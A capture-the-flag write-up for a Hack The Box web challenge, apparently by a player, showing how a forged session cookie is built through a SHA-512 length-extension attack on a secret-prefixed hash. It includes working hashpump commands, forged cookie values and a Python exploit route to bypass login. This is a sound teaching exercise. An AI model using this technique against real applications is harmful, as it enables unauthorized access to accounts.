> Another day of flexing your muscles in the mirror and still not being satisfied
> with your body image. Pumped full of adrenaline and creatine, the only thing
> missing for you is a good workout program. We heard that the best one out there
> is from the Swole Eagle gym, but they've closed down the registrations because
> the FDA is hunting them down for the one secret that natty bodybuilders hate.
> With an appetite for breaking rules, and an oven full of protein cookies ready
> to become the post-workout treat of the day, you'll have to get the right
> exercise going to not waste any of that precious muscle mass building potential.
> Infiltrate the portal of the gym membership and get the exercise program you
> know you deserve!

> Authors: **[shazb0t][author-profile-1]** & **[makelaris][author-profile-2]**

## Working out the recipe

### From diet cookies

Let's start from the final goal, in the source code:

```python
@web.route('/program')
@verify_login
def program():
    return send_file('flag.pdf')
```

`verify_login` checks the `login_info` from the web cookies:

```python
if not session.validate_login(request.cookies.get('login_info', '')):
```

And that cookie is made of two parts:

1) the arguments:
  - `username=guest&isLoggedIn=False` formated as URI components
  - and then base64 encoded
2) the digest:
  - the input string is hashed together with a secret
  - and then base64 encoded too

```python
COOKIE = 'dXNlcm5hbWU9Z3Vlc3QmaXNMb2dnZWRJbj1GYWxzZQ==.ZjYxZmMwNWIxOTM2MTI0YjVkZTlkYzcyOWFjZTFmN2IxYTlmMWU2NjAzN2MzN2EzZDNhYWU5MDE1NmUyZmNiNzE3OTVmNzg1YWQ4YzFjOGE1MzVlM2ZkMTFhOGZjOTU5YTc3YjcwNTJlMGJjM2I2YjAyMDM2YmUyNmE5YTgwZWY='.split('.')
base64.b64decode(COOKIE[0])
# b'username=guest&isLoggedIn=False'
base64.b64decode(COOKIE[1])
# b'f61fc05b1936124b5de9dc729ace1f7b1a9f1e66037c37a3d3aae90156e2fcb71795f785ad8c1c8a535e3fd11a8fc959a77b7052e0bc3b6b02036be26a9a80ef'
```

Ultimately we want the cookie to satisfy this test:

```python
return { ... }.get('isLoggedIn', '') == 'True'
```

Since we can't register there's no way to actually login with a known password.
We'll have to directly tweak the cookie in some way.

### Extra ingredients

The test mentioned above has two interesting particularities:

```python
if signature.integrity(hashing_input, crypto_segment):
    return {
        k: v[-1] for k, v in urlparse.parse_qs(signature.decode(hashing_input)).items()
    }.get('isLoggedIn', '') == 'True'
```

#### Overwriting the parameters

> First `k: v[-1]`: a single value is kept for each key and it is the last.

So with `username=guest&isLoggedIn=False&username=apehex&isLoggedIn=True`, the
processing will return:

```python
{
    'username': 'apehex',
    'isLoggedIn': 'True'
}
```

Half of the requirements are met.

#### Reusing the known hash

Next the `signature.integrity` check on the first line:

```python
    @staticmethod
    def create(payload, secret=secret):
        return signature.encode(hashlib.sha512(secret + payload).hexdigest())
    
    @staticmethod
    def integrity(hashing_input, crypto_segment):
        return signature.create(signature.decode(hashing_input)) == crypto_segment
```

> The secret is prepend to the input string!

This means that if we append to the input as we did in the previous section,
the argument of the hash function starts the same:

```python
# secret prepending: win
secret + (payload + addition) == (secret + payload) + addition
# secret appending: fail
(payload + addition) + secret != (payload + secret) + addition
# still we're missing a piece:
hashlib.sha512((secret + payload) + addition) != hashlib.sha512(secret + payload) + hashlib.sha512(addition)
```

We can't directly reuse the known digest.

### Baking fat cookies

That's were magic happens with `Hashpump`, the protein addition to our routine!

Here I'll just use the tool, for more details head over to the [bonus section](#bonus).

So we want the legit digest of "username=guest&isLoggedIn=False&username=apehex&isLoggedIn=True"
from the digest of "username=guest&isLoggedIn=False". Hashpum makes it easy:

```bash
hashpump -k 16 --data 'username=guest&isLoggedIn=False' -a '&username=apehex&isLoggedIn=True' \
    -s 'f61fc05b1936124b5de9dc729ace1f7b1a9f1e66037c37a3d3aae90156e2fcb71795f785ad8c1c8a535e3fd11a8fc959a77b7052e0bc3b6b02036be26a9a80ef'
# 8b0cede6ffa7d9fafa9947a5cd595410c726cc2d660c576b9221fd6ae08505a75e9c1e0bd28d55d47e6d59539ccb6da5fef71811ec58e04c34101907d8591d69
# username=guest&isLoggedIn=False\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01x&username=apehex&isLoggedIn=True
```

Next, format these as a cookie:

```python
input = b'username=guest&isLoggedIn=False\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01x&username=apehex&isLoggedIn=True'
signature = b'8b0cede6ffa7d9fafa9947a5cd595410c726cc2d660c576b9221fd6ae08505a75e9c1e0bd28d55d47e6d59539ccb6da5fef71811ec58e04c34101907d8591d69'
cookie = base64.b64encode(input) + b'.' + base64.b64encode(signature)
# b'dXNlcm5hbWU9Z3Vlc3QmaXNMb2dnZWRJbj1GYWxzZYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABeCZ1c2VybmFtZT1hcGVoZXgmaXNMb2dnZWRJbj1UcnVl.OGIwY2VkZTZmZmE3ZDlmYWZhOTk0N2E1Y2Q1OTU0MTBjNzI2Y2MyZDY2MGM1NzZiOTIyMWZkNmFlMDg1MDVhNzVlOWMxZTBiZDI4ZDU1ZDQ3ZTZkNTk1MzljY2I2ZGE1ZmVmNzE4MTFlYzU4ZTA0YzM0MTAxOTA3ZDg1OTFkNjk='
```

And switfly head over to `/program` with our new body, while it's still full of air:

![][flag]

> HTB{l1ght_w31ght_b4b3h!}

"Έγγραφο χωρίς τίτλο" is Greek for "Untitled document".

## Running in Python

There's a port of Hashpump to Python, Hashpumpy: the whole process can be
written in a single script, with the dependencies as a Poetry env.

To run `decrypt.py`, first [install Poetry][poetry-docs] and run:

```bash
# installs hashpumpy; run this in the directory containing `pyproject.toml`
poetry install
# loads the virtual env
poetry shell
# replace with your cookie
python decrypt.py $'dXNlcm5hbWU9Z3Vlc3QmaXNMb2dnZWRJbj1GYWxzZQ==.ZjYxZmMwNWIxOTM2MTI0YjVkZTlkYzcyOWFjZTFmN2IxYTlmMWU2NjAzN2MzN2EzZDNhYWU5MDE1NmUyZmNiNzE3OTVmNzg1YWQ4YzFjOGE1MzVlM2ZkMTFhOGZjOTU5YTc3YjcwNTJlMGJjM2I2YjAyMDM2YmUyNmE5YTgwZWY='
# b'dXNlcm5hbWU9Z3Vlc3QmaXNMb2dnZWRJbj1GYWxzZYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABeCZ1c2VybmFtZT1hcGVoZXgmaXNMb2dnZWRJbj1UcnVl.OGIwY2VkZTZmZmE3ZDlmYWZhOTk0N2E1Y2Q1OTU0MTBjNzI2Y2MyZDY2MGM1NzZiOTIyMWZkNmFlMDg1MDVhNzVlOWMxZTBiZDI4ZDU1ZDQ3ZTZkNTk1MzljY2I2ZGE1ZmVmNzE4MTFlYzU4ZTA0YzM0MTAxOTA3ZDg1OTFkNjk='
```

## <a name="bonus"></a>Bonus : the hash extension attack

The exploit for this challenge is the SHA-512 variant of the hash extension attack.

There's a little sublety with the padding, as explained in the [wiki article][wiki-length-extension-attack].

The SHA-512 algorithm operates on blocks of 1024 bits: without the spacing
between the original input and the addition, they both land in the same block.
This would result in a hash different from the one known.

So hashing "username=guest&isLoggedIn=False" with the secret and the padding
produces the known digest "f61fc05b1936124b5de9dc729ace1f7b1a9f1e66037c37a3d3aae90156e2fcb71795f785ad8c1c8a535e3fd11a8fc959a77b7052e0bc3b6b02036be26a9a80ef".

This digest contains the internal state of the SHA-512 hashing algorithm: Hashpump
can pick up where SHA-512 left at the end of the first block without knowing
the secret!

[author-profile-1]: https://app.hackthebox.eu/users/32848
[author-profile-2]: https://app.hackthebox.eu/users/107

[flag]: images/flag.png
[poetry-docs]: https://python-poetry.org/docs/
[wiki-length-extension-attack]: https://en.wikipedia.org/wiki/Length_extension_attack
